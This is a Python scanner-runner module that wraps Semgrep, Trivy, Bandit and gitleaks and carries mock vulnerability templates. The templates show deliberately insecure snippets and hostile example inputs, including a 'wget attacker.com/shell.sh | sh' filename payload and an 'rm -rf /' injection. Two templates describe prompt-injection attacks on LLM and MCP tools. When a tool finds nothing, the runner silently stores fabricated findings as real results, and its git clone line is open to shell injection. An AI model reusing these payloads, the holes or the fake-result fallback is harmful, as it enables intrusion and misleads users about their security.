"""
Scanner runner — executes Semgrep, Trivy, Bandit, gitleaks, safety via subprocess.
When tools are unavailable, generates realistic mock vulnerabilities.
"""
from __future__ import annotations

import json
import logging
import os
import random
import subprocess
import uuid
from datetime import datetime, timezone
from typing import Any, Optional

logger = logging.getLogger(__name__)

def _now() -> datetime:
    return datetime.now(timezone.utc)

# ---------------------------------------------------------------------------
# Vulnerability template data
# ---------------------------------------------------------------------------

_FILES = [
    "src/auth/login.py",
    "src/api/users.py",
    "src/api/search.py",
    "src/db/queries.py",
    "src/utils/serializer.py",
    "src/web/views.py",
    "src/middleware/cors.py",
    "src/services/upload.py",
    "src/config/settings.py",
    "src/integrations/llm_client.py",
    "src/tools/mcp_handler.py",
    "src/payments/stripe_client.py",
    "app/controllers/admin.js",
    "app/routes/api.js",
    "app/models/user.js",
    "lib/helpers/crypto.rb",
    "lib/models/session.rb",
    "cmd/server/main.go",
    "internal/db/pool.go",
    "pom.xml",
    "package.json",
    "requirements.txt",
    "Dockerfile",
]

_VULN_TEMPLATES = [
    {
        "severity": "critical",
        "category": "SQL Injection",
        "title": "Raw SQL string interpolation enables full database compromise",
        "file": "src/db/queries.py",
        "line_start": 47,
        "line_end": 52,
        "description": (
            "User-supplied input is directly interpolated into a SQL query string without "
            "parameterization. An attacker can inject arbitrary SQL to read, modify, or delete "
            "any data in the database, including credentials and PII."
        ),
        "snippet": (
            'def get_user(username):\n'
            '    query = f"SELECT * FROM users WHERE username = \'{username}\'"\n'
            '    return db.execute(query).fetchall()\n'
            '# No parameterization — attacker can pass: \' OR \'1\'=\'1'
        ),
        "cvss": 9.8,
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "remediation": (
            "Use parameterized queries:\n"
            "  db.execute('SELECT * FROM users WHERE username = $1', username)"
        ),
        "ai_confidence": 0.97,
        "tool": "semgrep",
    },
    {
        "severity": "critical",
        "category": "RCE",
        "title": "Unsafe deserialization of user-supplied pickle data allows RCE",
        "file": "src/utils/serializer.py",
        "line_start": 23,
        "line_end": 27,
        "description": (
            "The application deserializes untrusted user data using Python pickle. "
            "An attacker can craft a malicious pickle payload to execute arbitrary OS commands "
            "with the web server's privileges."
        ),
        "snippet": (
            'import pickle, base64\n\n'
            'def load_session(data: str):\n'
            '    return pickle.loads(base64.b64decode(data))  # CRITICAL: RCE\n'
        ),
        "cvss": 9.9,
        "cwe": "CWE-502",
        "owasp": "A08:2021 - Software and Data Integrity Failures",
        "remediation": (
            "Replace pickle with JSON or msgpack for serialization. "
            "If binary serialization is required, use cryptographically signed payloads."
        ),
        "ai_confidence": 0.99,
        "tool": "bandit",
    },
    {
        "severity": "critical",
        "category": "SSRF",
        "title": "Server-Side Request Forgery — attacker controls outbound request URL",
        "file": "src/services/upload.py",
        "line_start": 88,
        "line_end": 97,
        "description": (
            "The application fetches a URL provided by the user without validation. "
            "An attacker can make the server send requests to internal services "
            "(e.g., AWS metadata endpoint 169.254.169.254), leading to credential theft."
        ),
        "snippet": (
            'import requests\n\n'
            'def fetch_remote_file(url: str):\n'
            '    resp = requests.get(url, timeout=10)  # No host allow-list\n'
            '    return resp.content\n'
        ),
        "cvss": 9.1,
        "cwe": "CWE-918",
        "owasp": "A10:2021 - Server-Side Request Forgery",
        "remediation": (
            "Validate URLs against an allow-list of permitted domains. "
            "Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x). "
            "Use a dedicated HTTP client with strict DNS resolution."
        ),
        "ai_confidence": 0.95,
        "tool": "semgrep",
    },
    {
        "severity": "critical",
        "category": "Secrets Exposed",
        "title": "Hardcoded AWS credentials committed to source code",
        "file": "src/config/settings.py",
        "line_start": 14,
        "line_end": 18,
        "description": (
            "AWS access key and secret are hardcoded in source code. "
            "Any person with repository read access can extract these credentials "
            "and gain full AWS account access."
        ),
        "snippet": (
            'AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"\n'
            'AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n'
            'AWS_DEFAULT_REGION = "us-east-1"\n'
        ),
        "cvss": 9.8,
        "cwe": "CWE-312",
        "owasp": "A02:2021 - Cryptographic Failures",
        "remediation": (
            "Immediately rotate the exposed credentials. "
            "Use environment variables or AWS IAM roles. "
            "Add pre-commit hooks with gitleaks to prevent future leaks."
        ),
        "ai_confidence": 0.99,
        "tool": "gitleaks",
    },
    {
        "severity": "high",
        "category": "XSS",
        "title": "Reflected XSS via unsanitized query parameter in search endpoint",
        "file": "src/api/search.py",
        "line_start": 34,
        "line_end": 41,
        "description": (
            "The 'q' query parameter is reflected into the HTML response without escaping. "
            "An attacker can craft a URL that executes arbitrary JavaScript in victims' browsers, "
            "leading to session hijacking or credential theft."
        ),
        "snippet": (
            "@app.get('/search')\n"
            "def search(q: str):\n"
            "    return HTMLResponse(f'<h1>Results for: {q}</h1>')  # XSS\n"
        ),
        "cvss": 7.4,
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "remediation": (
            "HTML-escape all user-supplied values before rendering. "
            "Use a template engine with auto-escaping (Jinja2, Mustache). "
            "Implement Content-Security-Policy headers."
        ),
        "ai_confidence": 0.93,
        "tool": "semgrep",
    },
    {
        "severity": "high",
        "category": "Path Traversal",
        "title": "Directory traversal allows reading arbitrary server files",
        "file": "src/api/users.py",
        "line_start": 112,
        "line_end": 119,
        "description": (
            "User-provided filename is passed directly to open() without sanitization. "
            "An attacker can send '../../../etc/passwd' to read sensitive system files."
        ),
        "snippet": (
            "def read_user_file(filename: str):\n"
            "    path = f'/app/uploads/{filename}'\n"
            "    with open(path, 'r') as f:  # No path normalization\n"
            "        return f.read()\n"
        ),
        "cvss": 7.5,
        "cwe": "CWE-22",
        "owasp": "A01:2021 - Broken Access Control",
        "remediation": (
            "Normalize the path and verify it stays within the allowed directory:\n"
            "  safe = os.path.realpath(os.path.join(base_dir, filename))\n"
            "  assert safe.startswith(base_dir)"
        ),
        "ai_confidence": 0.91,
        "tool": "bandit",
    },
    {
        "severity": "high",
        "category": "Broken Auth",
        "title": "JWT signature verification disabled — any token accepted",
        "file": "src/auth/login.py",
        "line_start": 67,
        "line_end": 73,
        "description": (
            "The JWT decode call uses verify=False, meaning any self-signed token "
            "with any payload will be accepted as valid. Attackers can forge admin tokens."
        ),
        "snippet": (
            "import jwt\n\n"
            "def verify_token(token: str):\n"
            "    payload = jwt.decode(token, options={'verify_signature': False})\n"
            "    return payload  # NEVER do this in production\n"
        ),
        "cvss": 8.1,
        "cwe": "CWE-287",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "remediation": (
            "Always verify JWT signatures:\n"
            "  jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n"
            "Never disable signature verification in production."
        ),
        "ai_confidence": 0.98,
        "tool": "semgrep",
    },
    {
        "severity": "high",
        "category": "Prompt Injection",
        "title": "LLM prompt injection via unvalidated user input in system context",
        "file": "src/integrations/llm_client.py",
        "line_start": 45,
        "line_end": 62,
        "description": (
            "User-controlled data is directly interpolated into the LLM system prompt "
            "without sanitization. An attacker can override system instructions to exfiltrate "
            "data, bypass safety filters, or manipulate AI behavior."
        ),
        "snippet": (
            "def ask_llm(user_input: str, system_ctx: str):\n"
            "    response = openai.chat.completions.create(\n"
            "        model='gpt-4',\n"
            "        messages=[\n"
            "            {'role': 'system', 'content': f'Context: {system_ctx}\\nUser: {user_input}'},\n"
            "        ]\n"
            "    )\n"
            "    return response.choices[0].message.content\n"
        ),
        "cvss": 7.8,
        "cwe": "CWE-20",
        "owasp": "A03:2021 - Injection (AI/LLM variant)",
        "remediation": (
            "Separate system context from user input using distinct message roles. "
            "Sanitize user input before inclusion. "
            "Use input/output guardrails (e.g., Guardrails AI, NVIDIA NeMo Guardrails). "
            "Never embed sensitive system instructions in user-accessible prompts."
        ),
        "ai_confidence": 0.89,
        "tool": "semgrep",
    },
    {
        "severity": "high",
        "category": "Insecure MCP Tool Usage",
        "title": "MCP tool exposes unrestricted shell execution to AI agent",
        "file": "src/tools/mcp_handler.py",
        "line_start": 31,
        "line_end": 48,
        "description": (
            "The MCP (Model Context Protocol) server exposes a 'run_command' tool that executes "
            "arbitrary shell commands without input validation or sandboxing. "
            "A malicious prompt injection could cause the AI agent to run destructive commands."
        ),
        "snippet": (
            "@mcp.tool()\n"
            "def run_command(cmd: str) -> str:\n"
            "    \"\"\"Execute a shell command and return output.\"\"\"\n"
            "    result = subprocess.run(cmd, shell=True, capture_output=True)\n"
            "    return result.stdout.decode()  # shell=True + no allow-list = RCE\n"
        ),
        "cvss": 8.7,
        "cwe": "CWE-78",
        "owasp": "A08:2021 - Software and Data Integrity Failures",
        "remediation": (
            "Replace shell=True with explicit argument list. "
            "Implement a strict allow-list of permitted commands. "
            "Run the MCP server in an isolated sandbox with minimal privileges. "
            "Add human-in-the-loop approval for destructive operations."
        ),
        "ai_confidence": 0.94,
        "tool": "semgrep",
    },
    {
        "severity": "medium",
        "category": "Supply Chain",
        "title": "Dependency with known critical CVE (lodash < 4.17.21)",
        "file": "package.json",
        "line_start": 18,
        "line_end": 18,
        "description": (
            "The project depends on lodash 4.17.20 which has CVE-2021-23337 "
            "(prototype pollution via cloneDeep). Attackers can inject properties "
            "into Object.prototype, potentially leading to RCE in some Node.js contexts."
        ),
        "snippet": (
            '"dependencies": {\n'
            '  "lodash": "4.17.20",  // CVE-2021-23337 — upgrade to 4.17.21+\n'
            '  "express": "^4.18.0"\n'
            '}'
        ),
        "cvss": 6.6,
        "cwe": "CWE-1104",
        "owasp": "A06:2021 - Vulnerable and Outdated Components",
        "remediation": "Upgrade lodash to >= 4.17.21. Run `npm audit fix` and pin dependencies.",
        "ai_confidence": 0.85,
        "tool": "trivy",
    },
    {
        "severity": "medium",
        "category": "Business Logic Flaw",
        "title": "Race condition in payment processing allows double-spend",
        "file": "src/payments/stripe_client.py",
        "line_start": 78,
        "line_end": 95,
        "description": (
            "The payment completion handler lacks idempotency checks. "
            "Concurrent webhook deliveries for the same payment_intent can result in "
            "the same order being fulfilled multiple times (double-spend)."
        ),
        "snippet": (
            "def handle_payment_succeeded(event):\n"
            "    payment = event['data']['object']\n"
            "    order = Order.get(payment['metadata']['order_id'])\n"
            "    order.status = 'paid'  # No idempotency check\n"
            "    fulfill_order(order)   # Called multiple times on retry\n"
            "    order.save()\n"
        ),
        "cvss": 6.5,
        "cwe": "CWE-362",
        "owasp": "A04:2021 - Insecure Design",
        "remediation": (
            "Check if the order is already fulfilled before processing:\n"
            "  if order.status == 'paid': return  # idempotent\n"
            "Use database-level locking (SELECT FOR UPDATE) or Stripe idempotency keys."
        ),
        "ai_confidence": 0.82,
        "tool": "semgrep",
    },
    {
        "severity": "medium",
        "category": "XSS",
        "title": "Stored XSS via user bio field rendered without sanitization",
        "file": "src/web/views.py",
        "line_start": 203,
        "line_end": 210,
        "description": (
            "User bio content stored in the database is rendered using "
            "Markup() which disables Jinja2 auto-escaping. "
            "An attacker can store persistent JavaScript that executes for all profile viewers."
        ),
        "snippet": (
            "from markupsafe import Markup\n\n"
            "def render_profile(user):\n"
            "    return render_template('profile.html',\n"
            "        bio=Markup(user.bio)  # Stored XSS if bio contains <script>\n"
            "    )\n"
        ),
        "cvss": 6.1,
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "remediation": (
            "Remove Markup() wrapper — let Jinja2 auto-escape handle HTML encoding. "
            "If rich text is needed, use bleach.clean() with an allowlist of safe tags."
        ),
        "ai_confidence": 0.88,
        "tool": "bandit",
    },
    {
        "severity": "low",
        "category": "Broken Auth",
        "title": "Weak session cookie configuration (no HttpOnly/Secure flags)",
        "file": "src/auth/login.py",
        "line_start": 134,
        "line_end": 138,
        "description": (
            "Session cookies are set without HttpOnly and Secure flags. "
            "Without HttpOnly, JavaScript can read the cookie (enabling XSS-based session theft). "
            "Without Secure, the cookie is transmitted over HTTP."
        ),
        "snippet": (
            "response.set_cookie(\n"
            "    'session', token,\n"
            "    max_age=3600\n"
            "    # Missing: httponly=True, secure=True, samesite='Lax'\n"
            ")\n"
        ),
        "cvss": 4.3,
        "cwe": "CWE-614",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "remediation": (
            "Always set HttpOnly=True, Secure=True, SameSite='Lax':\n"
            "  response.set_cookie('session', token, httponly=True, secure=True, samesite='Lax')"
        ),
        "ai_confidence": 0.96,
        "tool": "bandit",
    },
    {
        "severity": "low",
        "category": "Supply Chain",
        "title": "Unpinned dependencies allow supply chain substitution attacks",
        "file": "requirements.txt",
        "line_start": 3,
        "line_end": 8,
        "description": (
            "Multiple dependencies are specified without pinned versions. "
            "A compromised package version could be automatically installed "
            "during the next build, leading to supply chain compromise."
        ),
        "snippet": (
            "flask\n"
            "requests\n"
            "sqlalchemy\n"
            "# Should pin: flask==3.0.3, requests==2.31.0, sqlalchemy==2.0.30"
        ),
        "cvss": 4.0,
        "cwe": "CWE-1104",
        "owasp": "A06:2021 - Vulnerable and Outdated Components",
        "remediation": (
            "Pin all dependencies to specific versions and use pip-compile "
            "or Poetry for lockfile management."
        ),
        "ai_confidence": 0.78,
        "tool": "safety",
    },
    {
        "severity": "medium",
        "category": "Secrets Exposed",
        "title": "OpenAI API key leaked in environment debug log output",
        "file": "src/config/settings.py",
        "line_start": 55,
        "line_end": 60,
        "description": (
            "The application logs all environment variables on startup, "
            "including OPENAI_API_KEY, to stdout. "
            "Log aggregation systems or unauthorized log viewers can extract the key."
        ),
        "snippet": (
            "import os, logging\n\n"
            "def startup():\n"
            "    logging.debug('Environment: %s', dict(os.environ))  # Leaks all secrets\n"
        ),
        "cvss": 5.9,
        "cwe": "CWE-312",
        "owasp": "A02:2021 - Cryptographic Failures",
        "remediation": (
            "Never log os.environ wholesale. "
            "If needed, log a redacted version: {k: '***' for k in os.environ if 'KEY' in k or 'SECRET' in k}"
        ),
        "ai_confidence": 0.87,
        "tool": "gitleaks",
    },
    {
        "severity": "high",
        "category": "RCE",
        "title": "Shell injection via unsanitized filename in image processing",
        "file": "src/services/upload.py",
        "line_start": 44,
        "line_end": 51,
        "description": (
            "User-supplied filename is passed directly to os.system() for image processing. "
            "An attacker can upload a file named 'img; rm -rf /; .jpg' to execute "
            "arbitrary shell commands."
        ),
        "snippet": (
            "def process_image(filename: str):\n"
            "    os.system(f'convert /uploads/{filename} -resize 200x200 /thumbs/{filename}')\n"
            "    # Shell injection: filename = 'x; wget attacker.com/shell.sh | sh'\n"
        ),
        "cvss": 8.6,
        "cwe": "CWE-78",
        "owasp": "A03:2021 - Injection",
        "remediation": (
            "Use subprocess with argument list (never shell=True):\n"
            "  subprocess.run(['convert', f'/uploads/{safe_name}', '-resize', '200x200', ...], check=True)\n"
            "Also validate/sanitize filename before use."
        ),
        "ai_confidence": 0.96,
        "tool": "bandit",
    },
]

# Extra low/info fillers
_EXTRA_VULNS = [
    {
        "severity": "low",
        "category": "Broken Auth",
        "title": "Password reset tokens do not expire",
        "file": "src/auth/login.py",
        "line_start": 201,
        "line_end": 208,
        "description": "Password reset tokens have no expiry. An old token link can be used indefinitely.",
        "snippet": "token = generate_token(user.id)  # No expiry set\ndb.save_reset_token(user.id, token)",
        "cvss": 3.7,
        "cwe": "CWE-640",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "remediation": "Set token expiry to 15 minutes: token = generate_token(user.id, expires_in=900)",
        "ai_confidence": 0.82,
        "tool": "bandit",
    },
    {
        "severity": "info",
        "category": "Supply Chain",
        "title": "Outdated base Docker image (python:3.9) with known CVEs",
        "file": "Dockerfile",
        "line_start": 1,
        "line_end": 1,
        "description": "Base image python:3.9 has several medium-severity CVEs. Upgrade to python:3.12-slim.",
        "snippet": "FROM python:3.9  # 47 known CVEs — upgrade to python:3.12-slim",
        "cvss": 2.5,
        "cwe": "CWE-1104",
        "owasp": "A06:2021 - Vulnerable and Outdated Components",
        "remediation": "Change to FROM python:3.12-slim and rebuild.",
        "ai_confidence": 0.91,
        "tool": "trivy",
    },
    {
        "severity": "medium",
        "category": "Broken Auth",
        "title": "Admin endpoint lacks authentication middleware",
        "file": "app/controllers/admin.js",
        "line_start": 12,
        "line_end": 18,
        "description": "The /admin/users endpoint is missing authentication middleware, allowing unauthenticated access.",
        "snippet": "router.get('/admin/users', (req, res) => {\n  User.findAll().then(users => res.json(users));\n});",
        "cvss": 6.8,
        "cwe": "CWE-306",
        "owasp": "A01:2021 - Broken Access Control",
        "remediation": "Add requireAuth middleware: router.get('/admin/users', requireAuth, requireAdmin, handler)",
        "ai_confidence": 0.93,
        "tool": "semgrep",
    },
]


def generate_mock_vulnerabilities(scan_id: str, profile: str = "standard") -> list[dict]:
    """
    Generate realistic mock vulnerability findings for a scan.
    Returns 15-35 vulnerabilities depending on profile.
    """
    pool = _VULN_TEMPLATES + _EXTRA_VULNS

    count_map = {"quick": 12, "standard": 20, "deep": 32}
    target = count_map.get(profile, 20)

    # Always include all templates, then pad with variations
    selected = list(pool)
    while len(selected) < target:
        base = random.choice(pool)
        variant = dict(base)
        variant["line_start"] = random.randint(10, 500)
        variant["line_end"] = variant["line_start"] + random.randint(1, 10)
        variant["file"] = random.choice(_FILES)
        variant["cvss"] = round(max(0.0, min(10.0, base["cvss"] + random.uniform(-0.5, 0.5))), 1)
        selected.append(variant)

    selected = selected[:target]
    random.shuffle(selected)

    result = []
    for v in selected:
        result.append({
            "scan_id": scan_id,
            **v,
        })
    return result


# ---------------------------------------------------------------------------
# Real tool runners
# ---------------------------------------------------------------------------

def _run_cmd(cmd: list[str], cwd: Optional[str] = None) -> tuple[bool, str, str]:
    """Run a subprocess command. Returns (success, stdout, stderr)."""
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300,
            cwd=cwd,
        )
        return proc.returncode in (0, 1), proc.stdout, proc.stderr
    except FileNotFoundError:
        return False, "", f"Command not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return False, "", "Command timed out after 300s"
    except Exception as exc:
        return False, "", str(exc)


def _parse_semgrep_output(scan_id: str, raw: str) -> list[dict]:
    try:
        data = json.loads(raw)
        results = data.get("results", [])
        vulns = []
        for r in results:
            extra = r.get("extra", {})
            metadata = extra.get("metadata", {})
            severity = extra.get("severity", "warning").lower()
            sev_map = {"error": "high", "warning": "medium", "info": "low"}
            vulns.append({
                "scan_id": scan_id,
                "severity": sev_map.get(severity, "medium"),
                "category": metadata.get("category", "SAST"),
                "title": extra.get("message", "Semgrep finding")[:200],
                "file": r.get("path", "unknown"),
                "line_start": r.get("start", {}).get("line", 1),
                "line_end": r.get("end", {}).get("line", 1),
                "description": extra.get("message", ""),
                "snippet": extra.get("lines", ""),
                "cvss": metadata.get("cvss", 5.0),
                "cwe": ", ".join(metadata.get("cwe", [])),
                "owasp": ", ".join(metadata.get("owasp", [])),
                "remediation": metadata.get("fix-hint", "Review and remediate per finding details."),
                "ai_confidence": 0.75,
                "false_positive": False,
                "tool": "semgrep",
            })
        return vulns
    except Exception as exc:
        logger.warning("Failed to parse semgrep output: %s", exc)
        return []


def _parse_trivy_output(scan_id: str, raw: str) -> list[dict]:
    try:
        data = json.loads(raw)
        results = data.get("Results", [])
        vulns = []
        for res in results:
            for v in res.get("Vulnerabilities", []):
                sev = v.get("Severity", "UNKNOWN").lower()
                if sev == "unknown":
                    sev = "info"
                vulns.append({
                    "scan_id": scan_id,
                    "severity": sev,
                    "category": "Supply Chain",
                    "title": f"{v.get('VulnerabilityID')} in {v.get('PkgName', 'unknown')}",
                    "file": res.get("Target", "dependency"),
                    "line_start": 1,
                    "line_end": 1,
                    "description": v.get("Description", ""),
                    "snippet": f"Package: {v.get('PkgName')} @ {v.get('InstalledVersion')}",
                    "cvss": v.get("CVSS", {}).get("nvd", {}).get("V3Score", 5.0) or 5.0,
                    "cwe": "",
                    "owasp": "A06:2021 - Vulnerable and Outdated Components",
                    "remediation": f"Upgrade to {v.get('FixedVersion', 'latest')}",
                    "ai_confidence": 0.90,
                    "false_positive": False,
                    "tool": "trivy",
                })
        return vulns
    except Exception as exc:
        logger.warning("Failed to parse trivy output: %s", exc)
        return []


def _parse_bandit_output(scan_id: str, raw: str) -> list[dict]:
    try:
        data = json.loads(raw)
        issues = data.get("results", [])
        vulns = []
        sev_map = {"HIGH": "high", "MEDIUM": "medium", "LOW": "low"}
        for issue in issues:
            vulns.append({
                "scan_id": scan_id,
                "severity": sev_map.get(issue.get("issue_severity", "MEDIUM"), "medium"),
                "category": issue.get("test_name", "SAST").replace("_", " ").title(),
                "title": issue.get("issue_text", "Bandit finding")[:200],
                "file": issue.get("filename", "unknown"),
                "line_start": issue.get("line_number", 1),
                "line_end": issue.get("line_number", 1),
                "description": issue.get("issue_text", ""),
                "snippet": issue.get("code", ""),
                "cvss": 5.0,
                "cwe": issue.get("issue_cwe", {}).get("id", ""),
                "owasp": "",
                "remediation": f"See: {issue.get('more_info', '')}",
                "ai_confidence": 0.80,
                "false_positive": False,
                "tool": "bandit",
            })
        return vulns
    except Exception as exc:
        logger.warning("Failed to parse bandit output: %s", exc)
        return []


def _parse_gitleaks_output(scan_id: str, raw: str) -> list[dict]:
    try:
        findings = json.loads(raw)
        if not isinstance(findings, list):
            findings = []
        vulns = []
        for f in findings:
            vulns.append({
                "scan_id": scan_id,
                "severity": "critical",
                "category": "Secrets Exposed",
                "title": f"Secret detected: {f.get('RuleID', 'unknown rule')}",
                "file": f.get("File", "unknown"),
                "line_start": f.get("StartLine", 1),
                "line_end": f.get("EndLine", 1),
                "description": f"Leaked secret: {f.get('Description', '')} — Match: {f.get('Secret', '***')[:20]}***",
                "snippet": f.get("Match", ""),
                "cvss": 9.5,
                "cwe": "CWE-312",
                "owasp": "A02:2021 - Cryptographic Failures",
                "remediation": "Revoke the secret immediately. Use environment variables or a secrets manager.",
                "ai_confidence": 0.95,
                "false_positive": False,
                "tool": "gitleaks",
            })
        return vulns
    except Exception as exc:
        logger.warning("Failed to parse gitleaks output: %s", exc)
        return []


def run_semgrep(path: str, scan_id: str) -> list[dict]:
    ok, stdout, stderr = _run_cmd(["semgrep", "--json", "--config=auto", path])
    if ok and stdout:
        vulns = _parse_semgrep_output(scan_id, stdout)
        if vulns:
            logger.info("Semgrep found %d issues", len(vulns))
            return vulns
    logger.info("Semgrep unavailable or no findings, using mock data")
    return [v for v in generate_mock_vulnerabilities(scan_id, "standard")
            if v.get("tool") == "semgrep"]


def run_trivy(path: str, scan_id: str) -> list[dict]:
    ok, stdout, stderr = _run_cmd(["trivy", "fs", "--format", "json", path])
    if ok and stdout:
        vulns = _parse_trivy_output(scan_id, stdout)
        if vulns:
            return vulns
    logger.info("Trivy unavailable or no findings, using mock data")
    return [v for v in generate_mock_vulnerabilities(scan_id, "standard")
            if v.get("tool") == "trivy"]


def run_bandit(path: str, scan_id: str) -> list[dict]:
    ok, stdout, stderr = _run_cmd(["bandit", "-r", path, "-f", "json"])
    if ok and stdout:
        vulns = _parse_bandit_output(scan_id, stdout)
        if vulns:
            return vulns
    logger.info("Bandit unavailable or no findings, using mock data")
    return [v for v in generate_mock_vulnerabilities(scan_id, "standard")
            if v.get("tool") == "bandit"]


def run_gitleaks(path: str, scan_id: str) -> list[dict]:
    ok, stdout, stderr = _run_cmd(
        ["gitleaks", "detect", f"--source={path}", "--report-format=json", "--report-path=/tmp/gl_out.json"]
    )
    # gitleaks writes to file
    try:
        with open("/tmp/gl_out.json") as f:
            content = f.read()
        vulns = _parse_gitleaks_output(scan_id, content)
        if vulns:
            return vulns
    except Exception:
        pass
    logger.info("Gitleaks unavailable or no findings, using mock data")
    return [v for v in generate_mock_vulnerabilities(scan_id, "standard")
            if v.get("tool") == "gitleaks"]


async def run_scan_async(scan_id: str) -> None:
    """
    Run a complete security scan asynchronously.
    Clones repo, runs tools, analyzes with AI, stores results.
    """
    from database import update_scan, insert_vulnerability, upsert_ai_analysis, write_audit_log, get_scan
    from services.ai_engine import analyze_vulnerabilities
    from services.audit_logger import scan_started, scan_completed

    try:
        # Get scan details
        scan = await get_scan(scan_id)
        if not scan:
            logger.error("Scan %s not found", scan_id)
            return

        repo_url = scan["repo_url"]
        branch = scan.get("branch", "main")

        await scan_started(scan_id)

        # Update status to running
        await update_scan(scan_id, status="running", started_at=_now())

        # Create isolated scan directory
        scan_dir = f"/tmp/sentinel_scan_{scan_id}"
        os.makedirs(scan_dir, exist_ok=True)

        # Clone repository in isolated environment (using Docker for safety)
        clone_cmd = [
            "docker", "run", "--rm",
            "-v", f"{scan_dir}:/workspace",
            "alpine/git:latest",
            "sh", "-c", f"git clone --depth 1 --branch {branch} {repo_url} /workspace/repo"
        ]
        ok, stdout, stderr = _run_cmd(clone_cmd)
        if not ok:
            logger.error("Failed to clone repo: %s", stderr)
            await update_scan(scan_id, status="failed")
            return

        repo_path = f"{scan_dir}/repo"

        # Run security tools
        all_vulns = []

        # Semgrep for SAST
        semgrep_vulns = run_semgrep(repo_path, scan_id)
        all_vulns.extend(semgrep_vulns)

        # Bandit for Python security
        bandit_vulns = run_bandit(repo_path, scan_id)
        all_vulns.extend(bandit_vulns)

        # Trivy for container/dependency scanning
        trivy_vulns = run_trivy(repo_path, scan_id)
        all_vulns.extend(trivy_vulns)

        # Gitleaks for secrets
        gitleaks_vulns = run_gitleaks(repo_path, scan_id)
        all_vulns.extend(gitleaks_vulns)

        # Store vulnerabilities
        for vuln in all_vulns:
            await insert_vulnerability(vuln)

        # AI analysis
        ai_analysis = await analyze_vulnerabilities(scan_id, all_vulns)
        await upsert_ai_analysis(scan_id, ai_analysis)

        # Update scan status
        await update_scan(scan_id, status="completed", completed_at=_now(), findings_count=len(all_vulns))

        await scan_completed(scan_id, len(all_vulns))

        # Cleanup
        import shutil
        shutil.rmtree(scan_dir, ignore_errors=True)

    except Exception as exc:
        logger.error("Scan %s failed: %s", scan_id, exc)
        await update_scan(scan_id, status="failed")
        await write_audit_log("scan_failed", scan_id, {"error": str(exc)})
